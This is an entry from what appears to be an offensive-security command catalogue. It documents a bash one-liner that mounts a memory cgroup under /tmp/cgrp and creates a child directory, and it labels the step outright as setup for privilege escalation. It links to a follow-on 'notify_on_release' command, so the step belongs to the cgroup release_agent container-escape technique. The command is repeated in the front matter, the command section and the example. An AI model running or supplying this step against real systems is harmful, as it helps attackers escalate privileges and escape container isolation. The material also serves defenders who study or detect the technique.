---
data: >-
  mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir
  /tmp/cgrp/x
tags:
  - cgroup
type: command
executor: bash
platforms:
  - Linux
id: 14f1bade-2d12-4319-930e-a0f31db3eef3
created_at: '2025-12-14T04:08:48.067Z'
updated_at: '2025-12-14T04:08:48.067Z'
verified: false
validated: true
submitted: true
---
# Setup Cgroup for Root Execution

## Command

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

## Description

Creates and mounts memory cgroup hierarchy for privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| memory | Cgroup type | Yes |

## Examples

### Basic Usage

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

## Expected Output

Cgroup mounted at /tmp/cgrp/x.

## Related

- [[commands/enable-cgroup-notify-on-release]]
